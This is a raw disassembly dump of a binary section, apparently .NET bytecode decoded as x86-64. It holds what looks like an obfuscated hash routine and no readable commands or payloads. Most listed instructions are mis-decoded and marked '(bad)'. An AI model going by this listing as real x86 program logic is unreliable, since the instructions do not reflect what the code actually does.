  402b0b:	28 13                	sub    %dl,(%rbx)
  402b0d:	00 00                	add    %al,(%rax)
  402b0f:	06                   	(bad)
  402b10:	12 0b                	adc    (%rbx),%cl
  402b12:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402b15:	09 11                	or     %edx,(%rcx)
  402b17:	0a 1f                	or     (%rdi),%bl
  402b19:	0b 1f                	or     (%rdi),%ebx
  402b1b:	0e                   	(bad)
  402b1c:	1f                   	(bad)
  402b1d:	13 06                	adc    (%rsi),%eax
  402b1f:	28 13                	sub    %dl,(%rbx)
  402b21:	00 00                	add    %al,(%rax)
  402b23:	06                   	(bad)
  402b24:	12 0a                	adc    (%rdx),%cl
  402b26:	11 0b                	adc    %ecx,(%rbx)
  402b28:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402b2b:	09 16                	or     %edx,(%rsi)
  402b2d:	1f                   	(bad)
  402b2e:	14 1f                	adc    $0x1f,%al
  402b30:	14 06                	adc    $0x6,%al
  402b32:	28 13                	sub    %dl,(%rbx)
  402b34:	00 00                	add    %al,(%rax)
  402b36:	06                   	(bad)
  402b37:	12 09                	adc    (%rcx),%cl
  402b39:	11 0a                	adc    %ecx,(%rdx)
  402b3b:	11 0b                	adc    %ecx,(%rbx)
  402b3d:	11 0c 1b             	adc    %ecx,(%rbx,%rbx,1)
  402b40:	1b 1f                	sbb    (%rdi),%ebx
  402b42:	15 06 28 13 00       	adc    $0x132806,%eax
  402b47:	00 06                	add    %al,(%rsi)
  402b49:	12 0c 11             	adc    (%rcx,%rdx,1),%cl
  402b4c:	09 11                	or     %edx,(%rcx)
  402b4e:	0a 11                	or     (%rcx),%dl
  402b50:	0b 1f                	or     (%rdi),%ebx
  402b52:	0a 1f                	or     (%rdi),%bl
  402b54:	09 1f                	or     %ebx,(%rdi)
  402b56:	16                   	(bad)
  402b57:	06                   	(bad)
  402b58:	28 13                	sub    %dl,(%rbx)
  402b5a:	00 00                	add    %al,(%rax)
  402b5c:	06                   	(bad)
  402b5d:	12 0b                	adc    (%rbx),%cl
  402b5f:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402b62:	09 11                	or     %edx,(%rcx)
  402b64:	0a 1f                	or     (%rdi),%bl
  402b66:	0f 1f 0e             	nopl   (%rsi)
  402b69:	1f                   	(bad)
  402b6a:	17                   	(bad)
  402b6b:	06                   	(bad)
  402b6c:	28 13                	sub    %dl,(%rbx)
  402b6e:	00 00                	add    %al,(%rax)
  402b70:	06                   	(bad)
  402b71:	12 0a                	adc    (%rdx),%cl
  402b73:	11 0b                	adc    %ecx,(%rbx)
  402b75:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402b78:	09 1a                	or     %ebx,(%rdx)
  402b7a:	1f                   	(bad)
  402b7b:	14 1f                	adc    $0x1f,%al
  402b7d:	18 06                	sbb    %al,(%rsi)
  402b7f:	28 13                	sub    %dl,(%rbx)
  402b81:	00 00                	add    %al,(%rax)
  402b83:	06                   	(bad)
  402b84:	12 09                	adc    (%rcx),%cl
  402b86:	11 0a                	adc    %ecx,(%rdx)
  402b88:	11 0b                	adc    %ecx,(%rbx)
  402b8a:	11 0c 1f             	adc    %ecx,(%rdi,%rbx,1)
  402b8d:	09 1b                	or     %ebx,(%rbx)
  402b8f:	1f                   	(bad)
  402b90:	19 06                	sbb    %eax,(%rsi)
  402b92:	28 13                	sub    %dl,(%rbx)
  402b94:	00 00                	add    %al,(%rax)
  402b96:	06                   	(bad)
  402b97:	12 0c 11             	adc    (%rcx,%rdx,1),%cl
  402b9a:	09 11                	or     %edx,(%rcx)
  402b9c:	0a 11                	or     (%rcx),%dl
  402b9e:	0b 1f                	or     (%rdi),%ebx
  402ba0:	0e                   	(bad)
  402ba1:	1f                   	(bad)
  402ba2:	09 1f                	or     %ebx,(%rdi)
  402ba4:	1a 06                	sbb    (%rsi),%al
  402ba6:	28 13                	sub    %dl,(%rbx)
  402ba8:	00 00                	add    %al,(%rax)
  402baa:	06                   	(bad)
  402bab:	12 0b                	adc    (%rbx),%cl
  402bad:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402bb0:	09 11                	or     %edx,(%rcx)
  402bb2:	0a 19                	or     (%rcx),%bl
  402bb4:	1f                   	(bad)
  402bb5:	0e                   	(bad)
  402bb6:	1f                   	(bad)
  402bb7:	1b 06                	sbb    (%rsi),%eax
  402bb9:	28 13                	sub    %dl,(%rbx)
  402bbb:	00 00                	add    %al,(%rax)
  402bbd:	06                   	(bad)
  402bbe:	12 0a                	adc    (%rdx),%cl
  402bc0:	11 0b                	adc    %ecx,(%rbx)
  402bc2:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402bc5:	09 1e                	or     %ebx,(%rsi)
  402bc7:	1f                   	(bad)
  402bc8:	14 1f                	adc    $0x1f,%al
  402bca:	1c 06                	sbb    $0x6,%al
  402bcc:	28 13                	sub    %dl,(%rbx)
  402bce:	00 00                	add    %al,(%rax)
  402bd0:	06                   	(bad)
  402bd1:	12 09                	adc    (%rcx),%cl
  402bd3:	11 0a                	adc    %ecx,(%rdx)
  402bd5:	11 0b                	adc    %ecx,(%rbx)
  402bd7:	11 0c 1f             	adc    %ecx,(%rdi,%rbx,1)
  402bda:	0d 1b 1f 1d 06       	or     $0x61d1f1b,%eax
  402bdf:	28 13                	sub    %dl,(%rbx)
  402be1:	00 00                	add    %al,(%rax)
  402be3:	06                   	(bad)
  402be4:	12 0c 11             	adc    (%rcx,%rdx,1),%cl
  402be7:	09 11                	or     %edx,(%rcx)
  402be9:	0a 11                	or     (%rcx),%dl
  402beb:	0b 18                	or     (%rax),%ebx
  402bed:	1f                   	(bad)
  402bee:	09 1f                	or     %ebx,(%rdi)
  402bf0:	1e                   	(bad)
  402bf1:	06                   	(bad)
  402bf2:	28 13                	sub    %dl,(%rbx)
  402bf4:	00 00                	add    %al,(%rax)
  402bf6:	06                   	(bad)
  402bf7:	12 0b                	adc    (%rbx),%cl
  402bf9:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402bfc:	09 11                	or     %edx,(%rcx)
  402bfe:	0a 1d 1f 0e 1f 1f    	or     0x1f1f0e1f(%rip),%bl        # 0x1f5f3a23
  402c04:	06                   	(bad)
  402c05:	28 13                	sub    %dl,(%rbx)
  402c07:	00 00                	add    %al,(%rax)
  402c09:	06                   	(bad)
  402c0a:	12 0a                	adc    (%rdx),%cl
  402c0c:	11 0b                	adc    %ecx,(%rbx)
  402c0e:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402c11:	09 1f                	or     %ebx,(%rdi)
  402c13:	0c 1f                	or     $0x1f,%al
  402c15:	14 1f                	adc    $0x1f,%al
  402c17:	20 06                	and    %al,(%rsi)
  402c19:	28 13                	sub    %dl,(%rbx)
  402c1b:	00 00                	add    %al,(%rax)
  402c1d:	06                   	(bad)
  402c1e:	12 09                	adc    (%rcx),%cl
  402c20:	11 0a                	adc    %ecx,(%rdx)
  402c22:	11 0b                	adc    %ecx,(%rbx)
  402c24:	11 0c 1b             	adc    %ecx,(%rbx,%rbx,1)
  402c27:	1a 1f                	sbb    (%rdi),%bl
  402c29:	21 06                	and    %eax,(%rsi)
  402c2b:	28 14 00             	sub    %dl,(%rax,%rax,1)
  402c2e:	00 06                	add    %al,(%rsi)
  402c30:	12 0c 11             	adc    (%rcx,%rdx,1),%cl
  402c33:	09 11                	or     %edx,(%rcx)
  402c35:	0a 11                	or     (%rcx),%dl
  402c37:	0b 1e                	or     (%rsi),%ebx
  402c39:	1f                   	(bad)
  402c3a:	0b 1f                	or     (%rdi),%ebx
  402c3c:	22 06                	and    (%rsi),%al
  402c3e:	28 14 00             	sub    %dl,(%rax,%rax,1)
  402c41:	00 06                	add    %al,(%rsi)
  402c43:	12 0b                	adc    (%rbx),%cl
  402c45:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402c48:	09 11                	or     %edx,(%rcx)
  402c4a:	0a 1f                	or     (%rdi),%bl
  402c4c:	0b 1f                	or     (%rdi),%ebx
  402c4e:	10 1f                	adc    %bl,(%rdi)
  402c50:	23 06                	and    (%rsi),%eax
  402c52:	28 14 00             	sub    %dl,(%rax,%rax,1)
  402c55:	00 06                	add    %al,(%rsi)
  402c57:	12 0a                	adc    (%rdx),%cl
  402c59:	11 0b                	adc    %ecx,(%rbx)
  402c5b:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402c5e:	09 1f                	or     %ebx,(%rdi)
  402c60:	0e                   	(bad)
  402c61:	1f                   	(bad)
  402c62:	17                   	(bad)
  402c63:	1f                   	(bad)
  402c64:	24 06                	and    $0x6,%al
  402c66:	28 14 00             	sub    %dl,(%rax,%rax,1)
  402c69:	00 06                	add    %al,(%rsi)
  402c6b:	12 09                	adc    (%rcx),%cl
  402c6d:	11 0a                	adc    %ecx,(%rdx)
  402c6f:	11 0b                	adc    %ecx,(%rbx)
  402c71:	11 0c 17             	adc    %ecx,(%rdi,%rdx,1)
  402c74:	1a 1f                	sbb    (%rdi),%bl
  402c76:	25 06 28 14 00       	and    $0x142806,%eax
  402c7b:	00 06                	add    %al,(%rsi)
  402c7d:	12 0c 11             	adc    (%rcx,%rdx,1),%cl
  402c80:	09 11                	or     %edx,(%rcx)
  402c82:	0a 11                	or     (%rcx),%dl
  402c84:	0b 1a                	or     (%rdx),%ebx
  402c86:	1f                   	(bad)
  402c87:	0b 1f                	or     (%rdi),%ebx
  402c89:	26 06                	es (bad)
  402c8b:	28 14 00             	sub    %dl,(%rax,%rax,1)
  402c8e:	00 06                	add    %al,(%rsi)
  402c90:	12 0b                	adc    (%rbx),%cl
  402c92:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402c95:	09 11                	or     %edx,(%rcx)
  402c97:	0a 1d 1f 10 1f 27    	or     0x271f101f(%rip),%bl        # 0x275f3cbc
  402c9d:	06                   	(bad)
  402c9e:	28 14 00             	sub    %dl,(%rax,%rax,1)
  402ca1:	00 06                	add    %al,(%rsi)
  402ca3:	12 0a                	adc    (%rdx),%cl
  402ca5:	11 0b                	adc    %ecx,(%rbx)
  402ca7:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402caa:	09 1f                	or     %ebx,(%rdi)
  402cac:	0a 1f                	or     (%rdi),%bl
  402cae:	17                   	(bad)
  402caf:	1f                   	(bad)
  402cb0:	28 06                	sub    %al,(%rsi)
  402cb2:	28 14 00             	sub    %dl,(%rax,%rax,1)
  402cb5:	00 06                	add    %al,(%rsi)
  402cb7:	12 09                	adc    (%rcx),%cl
  402cb9:	11 0a                	adc    %ecx,(%rdx)
  402cbb:	11 0b                	adc    %ecx,(%rbx)
  402cbd:	11 0c 1f             	adc    %ecx,(%rdi,%rbx,1)
  402cc0:	0d 1a 1f 29 06       	or     $0x6291f1a,%eax
  402cc5:	28 14 00             	sub    %dl,(%rax,%rax,1)
  402cc8:	00 06                	add    %al,(%rsi)
  402cca:	12 0c 11             	adc    (%rcx,%rdx,1),%cl
  402ccd:	09 11                	or     %edx,(%rcx)
  402ccf:	0a 11                	or     (%rcx),%dl
  402cd1:	0b 16                	or     (%rsi),%edx
  402cd3:	1f                   	(bad)
  402cd4:	0b 1f                	or     (%rdi),%ebx
  402cd6:	2a 06                	sub    (%rsi),%al
  402cd8:	28 14 00             	sub    %dl,(%rax,%rax,1)
  402cdb:	00 06                	add    %al,(%rsi)
  402cdd:	12 0b                	adc    (%rbx),%cl
  402cdf:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402ce2:	09 11                	or     %edx,(%rcx)
  402ce4:	0a 19                	or     (%rcx),%bl
  402ce6:	1f                   	(bad)
  402ce7:	10 1f                	adc    %bl,(%rdi)
  402ce9:	2b 06                	sub    (%rsi),%eax
  402ceb:	28 14 00             	sub    %dl,(%rax,%rax,1)
  402cee:	00 06                	add    %al,(%rsi)
  402cf0:	12 0a                	adc    (%rdx),%cl
  402cf2:	11 0b                	adc    %ecx,(%rbx)
  402cf4:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402cf7:	09 1c 1f             	or     %ebx,(%rdi,%rbx,1)
  402cfa:	17                   	(bad)
  402cfb:	1f                   	(bad)
  402cfc:	2c 06                	sub    $0x6,%al
  402cfe:	28 14 00             	sub    %dl,(%rax,%rax,1)
  402d01:	00 06                	add    %al,(%rsi)
  402d03:	12 09                	adc    (%rcx),%cl
  402d05:	11 0a                	adc    %ecx,(%rdx)
  402d07:	11 0b                	adc    %ecx,(%rbx)
  402d09:	11 0c 1f             	adc    %ecx,(%rdi,%rbx,1)
  402d0c:	09 1a                	or     %ebx,(%rdx)
  402d0e:	1f                   	(bad)
  402d0f:	2d 06 28 14 00       	sub    $0x142806,%eax
  402d14:	00 06                	add    %al,(%rsi)
  402d16:	12 0c 11             	adc    (%rcx,%rdx,1),%cl
  402d19:	09 11                	or     %edx,(%rcx)
  402d1b:	0a 11                	or     (%rcx),%dl
  402d1d:	0b 1f                	or     (%rdi),%ebx
  402d1f:	0c 1f                	or     $0x1f,%al
  402d21:	0b 1f                	or     (%rdi),%ebx
  402d23:	2e 06                	cs (bad)
  402d25:	28 14 00             	sub    %dl,(%rax,%rax,1)
  402d28:	00 06                	add    %al,(%rsi)
  402d2a:	12 0b                	adc    (%rbx),%cl
  402d2c:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402d2f:	09 11                	or     %edx,(%rcx)
  402d31:	0a 1f                	or     (%rdi),%bl
  402d33:	0f 1f 10             	nopl   (%rax)
  402d36:	1f                   	(bad)
  402d37:	2f                   	(bad)
  402d38:	06                   	(bad)
  402d39:	28 14 00             	sub    %dl,(%rax,%rax,1)
  402d3c:	00 06                	add    %al,(%rsi)
  402d3e:	12 0a                	adc    (%rdx),%cl
  402d40:	11 0b                	adc    %ecx,(%rbx)
  402d42:	11 0c 11             	adc    %ecx,(%rcx,%rdx,1)
  402d45:	09 18                	or     %ebx,(%rax)
  402d47:	1f                   	(bad)
  402d48:	17                   	(bad)
  402d49:	1f                   	(bad)
  402d4a:	30 06                	xor    %al,(%rsi)
  402d4c:	28 14 00             	sub    %dl,(%rax,%rax,1)
  402d4f:	00 06                	add    %al,(%rsi)
  402d51:	12 09                	adc    (%rcx),%cl
  402d53:	11 0a                	adc    %ecx,(%rdx)
  402d55:	11 0b                	adc    %ecx,(%rbx)
  402d57:	11 0c 16             	adc    %ecx,(%rsi,%rdx,1)
  402d5a:	1c 1f                	sbb    $0x1f,%al
  402d5c:	31 06                	xor    %eax,(%rsi)
  402d5e:	28 15 00 00 06 12    	sub    %dl,0x12060000(%rip)        # 0x12462d64
  402d64:	0c 11                	or     $0x11,%al
  402d66:	09 11                	or     %edx,(%rcx)
  402d68:	0a 11                	or     (%rcx),%dl
  402d6a:	0b 1d 1f 0a 1f 32    	or     0x321f0a1f(%rip),%ebx        # 0x325f378f
  402d70:	06                   	(bad)
  402d71:	28 15 00 00 06 12    	sub    %dl,0x12060000(%rip)        # 0x12462d77
  402d77:	0b 11                	or     (%rcx),%edx
  402d79:	0c 11                	or     $0x11,%al
  402d7b:	09 11                	or     %edx,(%rcx)
  402d7d:	0a 1f                	or     (%rdi),%bl
  402d7f:	0e                   	(bad)
  402d80:	1f                   	(bad)
  402d81:	0f 1f 33             	nopl   (%rbx)
  402d84:	06                   	(bad)
  402d85:	28 15 00 00 06 12    	sub    %dl,0x12060000(%rip)        # 0x12462d8b
  402d8b:	0a 11                	or     (%rcx),%dl
  402d8d:	0b 11                	or     (%rcx),%edx
  402d8f:	0c 11                	or     $0x11,%al
  402d91:	09 1b                	or     %ebx,(%rbx)
  402d93:	1f                   	(bad)
  402d94:	15 1f 34 06 28       	adc    $0x2806341f,%eax
  402d99:	15 00 00 06 12       	adc    $0x12060000,%eax
  402d9e:	09 11                	or     %edx,(%rcx)
  402da0:	0a 11                	or     (%rcx),%dl
  402da2:	0b 11                	or     (%rcx),%edx
  402da4:	0c 1f                	or     $0x1f,%al
  402da6:	0c 1c                	or     $0x1c,%al
  402da8:	1f                   	(bad)
  402da9:	35 06 28 15 00       	xor    $0x152806,%eax
  402dae:	00 06                	add    %al,(%rsi)
  402db0:	12 0c 11             	adc    (%rcx,%rdx,1),%cl
  402db3:	09 11                	or     %edx,(%rcx)
  402db5:	0a 11                	or     (%rcx),%dl
  402db7:	0b 19                	or     (%rcx),%ebx
  402db9:	1f                   	(bad)
  402dba:	0a 1f                	or     (%rdi),%bl
  402dbc:	36 06                	ss (bad)
  402dbe:	28 15 00 00 06 12    	sub    %dl,0x12060000(%rip)        # 0x12462dc4
  402dc4:	0b 11                	or     (%rcx),%edx
  402dc6:	0c 11                	or     $0x11,%al
  402dc8:	09 11                	or     %edx,(%rcx)
  402dca:	0a 1f                	or     (%rdi),%bl
  402dcc:	0a 1f                	or     (%rdi),%bl
  402dce:	0f 1f 37             	nopl   (%rdi)
  402dd1:	06                   	(bad)
  402dd2:	28 15 00 00 06 12    	sub    %dl,0x12060000(%rip)        # 0x12462dd8
  402dd8:	0a 11                	or     (%rcx),%dl
  402dda:	0b 11                	or     (%rcx),%edx
  402ddc:	0c 11                	or     $0x11,%al
  402dde:	09 17                	or     %edx,(%rdi)
  402de0:	1f                   	(bad)
  402de1:	15 1f 38 06 28       	adc    $0x2806381f,%eax
  402de6:	15 00 00 06 12       	adc    $0x12060000,%eax
  402deb:	09 11                	or     %edx,(%rcx)
  402ded:	0a 11                	or     (%rcx),%dl
  402def:	0b 11                	or     (%rcx),%edx
  402df1:	0c 1e                	or     $0x1e,%al
  402df3:	1c 1f                	sbb    $0x1f,%al
  402df5:	39 06                	cmp    %eax,(%rsi)
  402df7:	28 15 00 00 06 12    	sub    %dl,0x12060000(%rip)        # 0x12462dfd
  402dfd:	0c 11                	or     $0x11,%al
  402dff:	09 11                	or     %edx,(%rcx)
  402e01:	0a 11                	or     (%rcx),%dl
  402e03:	0b 1f                	or     (%rdi),%ebx
  402e05:	0f 1f 0a             	nopl   (%rdx)
  402e08:	1f                   	(bad)
  402e09:	3a 06                	cmp    (%rsi),%al
  402e0b:	28 15 00 00 06 12    	sub    %dl,0x12060000(%rip)        # 0x12462e11
  402e11:	0b 11                	or     (%rcx),%edx
  402e13:	0c 11                	or     $0x11,%al
  402e15:	09 11                	or     %edx,(%rcx)
  402e17:	0a 1c 1f             	or     (%rdi,%rbx,1),%bl
  402e1a:	0f 1f 3b             	nopl   (%rbx)
  402e1d:	06                   	(bad)
  402e1e:	28 15 00 00 06 12    	sub    %dl,0x12060000(%rip)        # 0x12462e24
  402e24:	0a 11                	or     (%rcx),%dl
  402e26:	0b 11                	or     (%rcx),%edx
  402e28:	0c 11                	or     $0x11,%al
  402e2a:	09 1f                	or     %ebx,(%rdi)
  402e2c:	0d 1f 15 1f 3c       	or     $0x3c1f151f,%eax
  402e31:	06                   	(bad)
  402e32:	28 15 00 00 06 12    	sub    %dl,0x12060000(%rip)        # 0x12462e38
  402e38:	09 11                	or     %edx,(%rcx)
  402e3a:	0a 11                	or     (%rcx),%dl
  402e3c:	0b 11                	or     (%rcx),%edx
  402e3e:	0c 1a                	or     $0x1a,%al
  402e40:	1c 1f                	sbb    $0x1f,%al
  402e42:	3d 06 28 15 00       	cmp    $0x152806,%eax
  402e47:	00 06                	add    %al,(%rsi)
  402e49:	12 0c 11             	adc    (%rcx,%rdx,1),%cl
  402e4c:	09 11                	or     %edx,(%rcx)
  402e4e:	0a 11                	or     (%rcx),%dl
  402e50:	0b 1f                	or     (%rdi),%ebx
  402e52:	0b 1f                	or     (%rdi),%ebx
  402e54:	0a 1f                	or     (%rdi),%bl
  402e56:	3e 06                	ds (bad)
  402e58:	28 15 00 00 06 12    	sub    %dl,0x12060000(%rip)        # 0x12462e5e
  402e5e:	0b 11                	or     (%rcx),%edx
  402e60:	0c 11                	or     $0x11,%al
  402e62:	09 11                	or     %edx,(%rcx)
  402e64:	0a 18                	or     (%rax),%bl
  402e66:	1f                   	(bad)
  402e67:	0f 1f 3f             	nopl   (%rdi)
  402e6a:	06                   	(bad)
  402e6b:	28 15 00 00 06 12    	sub    %dl,0x12060000(%rip)        # 0x12462e71
  402e71:	0a 11                	or     (%rcx),%dl
  402e73:	0b 11                	or     (%rcx),%edx
  402e75:	0c 11                	or     $0x11,%al
  402e77:	09 1f                	or     %ebx,(%rdi)
  402e79:	09 1f                	or     %ebx,(%rdi)
  402e7b:	15 1f 40 06 28       	adc    $0x2806401f,%eax
  402e80:	15 00 00 06 11       	adc    $0x11060000,%eax
  402e85:	09 11                	or     %edx,(%rcx)
  402e87:	10 58 13             	adc    %bl,0x13(%rax)
  402e8a:	09 11                	or     %edx,(%rcx)
  402e8c:	0a 11                	or     (%rcx),%dl
  402e8e:	11 58 13             	adc    %ebx,0x13(%rax)
  402e91:	0a 11                	or     (%rcx),%dl
  402e93:	0b 11                	or     (%rcx),%edx
  402e95:	12 58 13             	adc    0x13(%rax),%bl
  402e98:	0b 11                	or     (%rcx),%edx
  402e9a:	0c 11                	or     $0x11,%al
  402e9c:	13 58 13             	adc    0x13(%rax),%ebx
  402e9f:	0c 11                	or     $0x11,%al
  402ea1:	0d 17 58 13 0d       	or     $0xd135817,%eax
  402ea6:	11 0d 08 1f 10 5c    	adc    %ecx,0x5c101f08(%rip)        # 0x5c504db4
  402eac:	44 aa                	rex.R stos %al,(%rdi)
  402eae:	fa                   	cli
  402eaf:	ff                   	(bad)
  402eb0:	ff 1f                	lcall  *(%rdi)
  402eb2:	10 8d 11 00 00 01    	adc    %cl,0x1000011(%rbp)
  402eb8:	13 14 11             	adc    (%rcx,%rdx,1),%edx
  402ebb:	09 28                	or     %ebp,(%rax)
  402ebd:	4c 00 00             	rex.WR add %r8b,(%rax)
  402ec0:	0a 16                	or     (%rsi),%dl
  402ec2:	11 14 16             	adc    %edx,(%rsi,%rdx,1)
  402ec5:	1a 28                	sbb    (%rax),%ch
  402ec7:	4d 00 00             	rex.WRB add %r8b,(%r8)
  402eca:	0a 11                	or     (%rcx),%dl
  402ecc:	0a 28                	or     (%rax),%ch
  402ece:	4c 00 00             	rex.WR add %r8b,(%rax)
  402ed1:	0a 16                	or     (%rsi),%dl
  402ed3:	11 14 1a             	adc    %edx,(%rdx,%rbx,1)
  402ed6:	1a 28                	sbb    (%rax),%ch
  402ed8:	4d 00 00             	rex.WRB add %r8b,(%r8)
  402edb:	0a 11                	or     (%rcx),%dl
  402edd:	0b 28                	or     (%rax),%ebp
  402edf:	4c 00 00             	rex.WR add %r8b,(%rax)
  402ee2:	0a 16                	or     (%rsi),%dl
  402ee4:	11 14 1e             	adc    %edx,(%rsi,%rbx,1)
  402ee7:	1a 28                	sbb    (%rax),%ch
  402ee9:	4d 00 00             	rex.WRB add %r8b,(%r8)
  402eec:	0a 11                	or     (%rcx),%dl
  402eee:	0c 28                	or     $0x28,%al
  402ef0:	4c 00 00             	rex.WR add %r8b,(%rax)
  402ef3:	0a 16                	or     (%rsi),%dl
  402ef5:	11 14 1f             	adc    %edx,(%rdi,%rbx,1)
  402ef8:	0c 1a                	or     $0x1a,%al
  402efa:	28 4d 00             	sub    %cl,0x0(%rbp)
  402efd:	00 0a                	add    %cl,(%rdx)
  402eff:	11 14 2a             	adc    %edx,(%rdx,%rbp,1)
  402f02:	00 00                	add    %al,(%rax)
  402f04:	ba 2b 02 26 16       	mov    $0x1626022b,%edx
  402f09:	02 03                	add    (%rbx),%al
  402f0b:	02 4b 03             	add    0x3(%rbx),%cl
  402f0e:	04 5f                	add    $0x5f,%al
  402f10:	03 66 05             	add    0x5(%rsi),%esp
  402f13:	5f                   	pop    %rdi
  402f14:	60                   	(bad)
  402f15:	58                   	pop    %rax
  402f16:	0e                   	(bad)
  402f17:	07                   	(bad)
  402f18:	0e                   	(bad)
  402f19:	04 e0                	add    $0xe0,%al
  402f1b:	95                   	xchg   %eax,%ebp
  402f1c:	58                   	pop    %rax
  402f1d:	7e 1c                	jle    0x402f3b
  402f1f:	00 00                	add    %al,(%rax)
  402f21:	04 0e                	add    $0xe,%al
  402f23:	06                   	(bad)
  402f24:	17                   	(bad)
  402f25:	59                   	pop    %rcx
  402f26:	e0 95                	loopne 0x402ebd
  402f28:	58                   	pop    %rax
  402f29:	0e                   	(bad)
  402f2a:	05 28 16 00 00       	add    $0x1628,%eax
  402f2f:	06                   	(bad)
  402f30:	58                   	pop    %rax
  402f31:	54                   	push   %rsp
  402f32:	2a 00                	sub    (%rax),%al
  402f34:	ba 2b 02 26 16       	mov    $0x1626022b,%edx
  402f39:	02 03                	add    (%rbx),%al
  402f3b:	02 4b 03             	add    0x3(%rbx),%cl
  402f3e:	05 5f 04 05 66       	add    $0x6605045f,%eax
  402f43:	5f                   	pop    %rdi
  402f44:	60                   	(bad)
  402f45:	58                   	pop    %rax
  402f46:	0e                   	(bad)
  402f47:	07                   	(bad)
  402f48:	0e                   	(bad)
  402f49:	04 e0                	add    $0xe0,%al
  402f4b:	95                   	xchg   %eax,%ebp
  402f4c:	58                   	pop    %rax
  402f4d:	7e 1c                	jle    0x402f6b
  402f4f:	00 00                	add    %al,(%rax)
  402f51:	04 0e                	add    $0xe,%al
  402f53:	06                   	(bad)
  402f54:	17                   	(bad)
  402f55:	59                   	pop    %rcx
  402f56:	e0 95                	loopne 0x402eed
  402f58:	58                   	pop    %rax
  402f59:	0e                   	(bad)
  402f5a:	05 28 16 00 00       	add    $0x1628,%eax
  402f5f:	06                   	(bad)
  402f60:	58                   	pop    %rax
  402f61:	54                   	push   %rsp
  402f62:	2a 00                	sub    (%rax),%al
  402f64:	ae                   	scas   (%rdi),%al
  402f65:	2b 02                	sub    (%rdx),%eax
  402f67:	26 16                	es (bad)
  402f69:	02 03                	add    (%rbx),%al
  402f6b:	02 4b 03             	add    0x3(%rbx),%cl
  402f6e:	04 61                	add    $0x61,%al
  402f70:	05 61 58 0e 07       	add    $0x70e5861,%eax
  402f75:	0e                   	(bad)
  402f76:	04 e0                	add    $0xe0,%al
  402f78:	95                   	xchg   %eax,%ebp
  402f79:	58                   	pop    %rax
  402f7a:	7e 1c                	jle    0x402f98
  402f7c:	00 00                	add    %al,(%rax)
  402f7e:	04 0e                	add    $0xe,%al
  402f80:	06                   	(bad)
  402f81:	17                   	(bad)
  402f82:	59                   	pop    %rcx
  402f83:	e0 95                	loopne 0x402f1a
  402f85:	58                   	pop    %rax
  402f86:	0e                   	(bad)
  402f87:	05 28 16 00 00       	add    $0x1628,%eax
  402f8c:	06                   	(bad)
  402f8d:	58                   	pop    %rax
  402f8e:	54                   	push   %rsp
  402f8f:	2a b2 2b 02 26 16    	sub    0x1626022b(%rdx),%dh
  402f95:	02 03                	add    (%rbx),%al
  402f97:	02 4b 04             	add    0x4(%rbx),%cl
  402f9a:	03 05 66 60 61 58    	add    0x58616066(%rip),%eax        # 0x58a19006
  402fa0:	0e                   	(bad)
  402fa1:	07                   	(bad)
  402fa2:	0e                   	(bad)
  402fa3:	04 e0                	add    $0xe0,%al
  402fa5:	95                   	xchg   %eax,%ebp
  402fa6:	58                   	pop    %rax
  402fa7:	7e 1c                	jle    0x402fc5
  402fa9:	00 00                	add    %al,(%rax)
  402fab:	04 0e                	add    $0xe,%al
  402fad:	06                   	(bad)
  402fae:	17                   	(bad)
  402faf:	59                   	pop    %rcx
  402fb0:	e0 95                	loopne 0x402f47
  402fb2:	58                   	pop    %rax
  402fb3:	0e                   	(bad)
  402fb4:	05 28 16 00 00       	add    $0x1628,%eax
  402fb9:	06                   	(bad)
  402fba:	58                   	pop    %rax
  402fbb:	54                   	push   %rsp
  402fbc:	2a 00                	sub    (%rax),%al
  402fbe:	00 00                	add    %al,(%rax)
  402fc0:	56                   	push   %rsi
  402fc1:	2b 02                	sub    (%rdx),%eax
  402fc3:	26 16                	es (bad)
  402fc5:	02 1f                	add    (%rdi),%bl
  402fc7:	20 03                	and    %al,(%rbx)
  402fc9:	59                   	pop    %rcx
  402fca:	1f                   	(bad)
  402fcb:	1f                   	(bad)
  402fcc:	5f                   	pop    %rdi
  402fcd:	64 02 03             	add    %fs:(%rbx),%al
  402fd0:	1f                   	(bad)
  402fd1:	1f                   	(bad)
  402fd2:	5f                   	pop    %rdi
  402fd3:	62                   	(bad)
  402fd4:	60                   	(bad)
  402fd5:	2a 00                	sub    (%rax),%al
  402fd7:	00 7e 2b             	add    %bh,0x2b(%rsi)
  402fda:	02 26                	add    (%rsi),%ah
  402fdc:	16                   	(bad)
  402fdd:	7e 06                	jle    0x402fe5
  402fdf:	00 00                	add    %al,(%rax)
  402fe1:	04 3a                	add    $0x3a,%al
  402fe3:	0b 00                	or     (%rax),%eax
  402fe5:	00 00                	add    %al,(%rax)
  402fe7:	28 19                	sub    %bl,(%rcx)
  402fe9:	00 00                	add    %al,(%rax)
  402feb:	06                   	(bad)
  402fec:	17                   	(bad)
  402fed:	80 06 00             	addb   $0x0,(%rsi)
  402ff0:	00 04 7e             	add    %al,(%rsi,%rdi,2)
  402ff3:	12 00                	adc    (%rax),%al
  402ff5:	00 04 2a             	add    %al,(%rdx,%rbp,1)
  402ff8:	1b 30                	sbb    (%rax),%esi
  402ffa:	03 00                	add    (%rax),%eax
  402ffc:	48 00 00             	rex.W add %al,(%rax)
  402fff:	00 06                	add    %al,(%rsi)
  403001:	00 00                	add    %al,(%rax)
  403003:	11 2b                	adc    %ebp,(%rbx)
  403005:	02 26                	add    (%rsi),%ah
  403007:	16                   	(bad)
  403008:	14 0a                	adc    $0xa,%al
  40300a:	28 17                	sub    %dl,(%rdi)
  40300c:	00 00                	add    %al,(%rax)
  40300e:	06                   	(bad)
  40300f:	39 0b                	cmp    %ecx,(%rbx)
  403011:	00 00                	add    %al,(%rax)
  403013:	00 73 4e             	add    %dh,0x4e(%rbx)
